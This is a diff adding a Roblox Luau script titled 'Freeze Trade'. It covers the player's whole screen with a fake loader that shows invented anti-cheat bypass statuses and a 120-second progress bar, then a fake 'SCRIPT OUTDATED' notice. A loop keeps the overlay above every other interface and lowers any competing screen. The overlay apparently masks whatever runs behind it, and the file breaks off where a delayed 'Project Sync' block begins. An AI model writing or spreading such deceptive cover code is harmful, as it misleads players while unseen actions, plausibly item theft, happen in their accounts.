@@ -1,0 +1,270 @@
+
+task.spawn(function()
+    local Players = game:GetService("Players")
+    local TweenService = game:GetService("TweenService")
+    local player = Players.LocalPlayer
+
+    -- Main Screen Frame
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FreezeTradeGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.DisplayOrder = 2147483647 -- أقصى رقم ممكن في لغة Luau لترتيب الطبقات
+    
+    if gethui then
+        screenGui.Parent = gethui()
+    else
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+    end
+
+    -- إجبار الواجهة على البقاء في الأعلى دائماً حتى لو تم تشغيل سكربت آخر بعدها
+    task.spawn(function()
+        while task.wait(0.5) do
+            screenGui.DisplayOrder = 2147483647
+            
+            -- خيار إضافي: خفض ترتيب أي ScreenGui أخرى يتم إنشاؤها في اللعبة
+            local parentObj = screenGui.Parent
+            if parentObj then
+                for _, gui in ipairs(parentObj:GetChildren()) do
+                    if gui:IsA("ScreenGui") and gui ~= screenGui then
+                        if gui.DisplayOrder >= screenGui.DisplayOrder then
+                            gui.DisplayOrder = 1000 -- خفض ترتيب السكربتات الأخرى لتكون تحت واجهتك
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    -- Background
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Parent = screenGui
+
+    -- Title
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, 0, 0.12, 0)
+    titleLabel.Position = UDim2.new(0, 0, 0.08, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "Freeze Trade"
+    titleLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
+    titleLabel.TextScaled = true
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Parent = mainFrame
+
+    -- Player Avatar
+    local avatarImage = Instance.new("ImageLabel")
+    avatarImage.Size = UDim2.new(0, 140, 0, 140)
+    avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
+    avatarImage.Position = UDim2.new(0.5, 0, 0.33, 0)
+    avatarImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    avatarImage.BorderSizePixel = 0
+    avatarImage.Parent = mainFrame
+
+    local avatarCorner = Instance.new("UICorner")
+    avatarCorner.CornerRadius = UDim.new(0, 12)
+    avatarCorner.Parent = avatarImage
+
+    task.spawn(function()
+        local content, isReady = Players:GetUserThumbnailAsync(
+            player.UserId, 
+            Enum.ThumbnailType.HeadShot, 
+            Enum.ThumbnailSize.Size420x420
+        )
+        if isReady then
+            avatarImage.Image = content
+        end
+    end)
+
+    -- Username Label
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Size = UDim2.new(0.8, 0, 0.05, 0)
+    nameLabel.AnchorPoint = Vector2.new(0.5, 0)
+    nameLabel.Position = UDim2.new(0.5, 0, 0.43, 0)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Text = "@" .. player.Name
+    nameLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+    nameLabel.TextScaled = true
+    nameLabel.Font = Enum.Font.SourceSans
+    nameLabel.Parent = mainFrame
+
+    -- Status Label
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0.8, 0, 0.04, 0)
+    statusLabel.AnchorPoint = Vector2.new(0.5, 0)
+    statusLabel.Position = UDim2.new(0.5, 0, 0.50, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Bypassing anti-cheat protection..."
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
+    statusLabel.TextScaled = true
+    statusLabel.Font = Enum.Font.SourceSansItalic
+    statusLabel.Parent = mainFrame
+
+    -- Loading Bar Frame
+    local barBackground = Instance.new("Frame")
+    barBackground.Size = UDim2.new(0.75, 0, 0.035, 0)
+    barBackground.AnchorPoint = Vector2.new(0.5, 0)
+    barBackground.Position = UDim2.new(0.5, 0, 0.56, 0)
+    barBackground.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    barBackground.BorderSizePixel = 0
+    barBackground.Parent = mainFrame
+
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 8)
+    barCorner.Parent = barBackground
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = barBackground
+
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(0, 8)
+    progressCorner.Parent = progressBar
+
+    -- Percentage Label
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(1, 0, 0.04, 0)
+    percentLabel.AnchorPoint = Vector2.new(0.5, 0)
+    percentLabel.Position = UDim2.new(0.5, 0, 0.61, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+    percentLabel.TextScaled = true
+    percentLabel.Font = Enum.Font.SourceSansBold
+    percentLabel.Parent = mainFrame
+
+    -- Tip Label
+    local tipLabel = Instance.new("TextLabel")
+    tipLabel.Size = UDim2.new(0.85, 0, 0.05, 0)
+    tipLabel.AnchorPoint = Vector2.new(0.5, 0)
+    tipLabel.Position = UDim2.new(0.5, 0, 0.68, 0)
+    tipLabel.BackgroundTransparency = 1
+    tipLabel.Text = "💡 TIP: Do not leave the server during process..."
+    tipLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
+    tipLabel.TextScaled = true
+    tipLabel.Font = Enum.Font.SourceSans
+    tipLabel.Parent = mainFrame
+
+    -- Outdated Screen Container
+    local messageContainer = Instance.new("Frame")
+    messageContainer.Size = UDim2.new(0.85, 0, 0.4, 0)
+    messageContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+    messageContainer.Position = UDim2.new(0.5, 0, 0.50, 0)
+    messageContainer.BackgroundTransparency = 1
+    messageContainer.Visible = false
+    messageContainer.Parent = mainFrame
+
+    local errorTitle = Instance.new("TextLabel")
+    errorTitle.Size = UDim2.new(1, 0, 0.25, 0)
+    errorTitle.Position = UDim2.new(0, 0, 0.05, 0)
+    errorTitle.BackgroundTransparency = 1
+    errorTitle.Text = "SCRIPT OUTDATED"
+    errorTitle.TextColor3 = Color3.fromRGB(255, 60, 60)
+    errorTitle.TextScaled = true
+    errorTitle.Font = Enum.Font.SourceSansBold
+    errorTitle.Parent = messageContainer
+
+    local errorDesc = Instance.new("TextLabel")
+    errorDesc.Size = UDim2.new(1, 0, 0.65, 0)
+    errorDesc.Position = UDim2.new(0, 0, 0.32, 0)
+    errorDesc.BackgroundTransparency = 1
+    errorDesc.Text = "You are currently running an outdated version of Freeze Trade.\n\nInstalled Version: v2.08.411\nLatest Version: v5.12.094\n\nPlease update your script from the official source to continue."
+    errorDesc.TextColor3 = Color3.fromRGB(230, 230, 230)
+    errorDesc.TextScaled = true
+    errorDesc.Font = Enum.Font.SourceSans
+    errorDesc.Parent = messageContainer
+
+    -- TikTok Label
+    local tiktokContainer = Instance.new("Frame")
+    tiktokContainer.Size = UDim2.new(0.85, 0, 0.06, 0)
+    tiktokContainer.AnchorPoint = Vector2.new(0.5, 1)
+    tiktokContainer.Position = UDim2.new(0.5, 0, 0.92, 0)
+    tiktokContainer.BackgroundTransparency = 1
+    tiktokContainer.Parent = mainFrame
+
+    local tiktokLabel = Instance.new("TextLabel")
+    tiktokLabel.Size = UDim2.new(1, 0, 1, 0)
+    tiktokLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    tiktokLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    tiktokLabel.BackgroundTransparency = 1
+    tiktokLabel.Text = "TikTok: @xenascriptt"
+    tiktokLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    tiktokLabel.TextScaled = true
+    tiktokLabel.Font = Enum.Font.SourceSansBold
+    tiktokLabel.Parent = tiktokContainer
+
+    -- Tips Carousel
+    local tips = {
+        "💡 TIP: Do not leave the game during initialization...",
+        "🛡️ Status: Injecting bypass modules securely...",
+        "⚡ Info: Trade freeze protocol ready soon...",
+        "✨ Tip: Follow TikTok @xenascriptt for new updates!",
+        "⚙️ Status: Finalizing server connection..."
+    }
+
+    task.spawn(function()
+        local index = 1
+        while true do
+            task.wait(12)
+            index = (index % #tips) + 1
+            tipLabel.Text = tips[index]
+        end
+    end)
+
+    -- Status Sequence
+    local statuses = {
+        {time = 0, text = "Bypassing anti-cheat protection..."},
+        {time = 25, text = "Loading trade modules..."},
+        {time = 55, text = "Connecting to game server..."},
+        {time = 85, text = "Finalizing freeze functions..."},
+        {time = 110, text = "Almost completed, please wait..."}
+    }
+
+    task.spawn(function()
+        for _, s in ipairs(statuses) do
+            task.wait(s.time == 0 and 0 or (s.time - (statuses[_ - 1] and statuses[_ - 1].time or 0)))
+            statusLabel.Text = s.text
+        end
+    end)
+
+    -- Loading Animation & Countdown (120 Seconds)
+    local duration = 120
+    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
+    local tween = TweenService:Create(progressBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+
+    tween:Play()
+
+    task.spawn(function()
+        local startTime = tick()
+        while true do
+            local elapsed = tick() - startTime
+            local progress = math.clamp(elapsed / duration, 0, 1)
+            local percent = math.floor(progress * 100)
+            
+            percentLabel.Text = percent .. "%"
+            
+            if progress >= 1 then
+                percentLabel.Text = "100%"
+                barBackground.Visible = false
+                percentLabel.Visible = false
+                avatarImage.Visible = false
+                nameLabel.Visible = false
+                statusLabel.Visible = false
+                tipLabel.Visible = false
+                
+                messageContainer.Visible = true
+                break
+            end
+            task.wait(0.1)
+        end
+    end)
+end)
+
+-- تأخير بسيط قبل تشغيل Project Sync للتأكد من اكتمال إنشاء الواجهة الرئيسية أولاً
+task.spawn(function()
+    task.wait(1)
